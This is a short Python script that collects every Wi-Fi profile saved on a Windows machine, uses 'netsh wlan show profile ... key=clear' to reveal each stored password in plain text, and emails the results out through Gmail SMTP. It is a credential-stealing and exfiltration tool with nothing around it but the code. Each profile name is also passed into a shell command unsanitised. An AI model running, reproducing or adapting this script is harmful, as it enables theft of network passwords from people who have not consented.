import subprocess
import re
import requests
import smtplib

email = input("[+] Enter your email address: ")
password = input("[+] Enter your password: ")

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

list_networks = subprocess.check_output(["netsh", "wlan", "show", "profile"]).decode("utf-8")
find_networks = re.findall("(?:Profile\s*:\s)(.*)", list_networks)

results = ""

for network_name in find_networks:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True).decode("utf-8")
    results += current_result

send_mail(email, password, results)

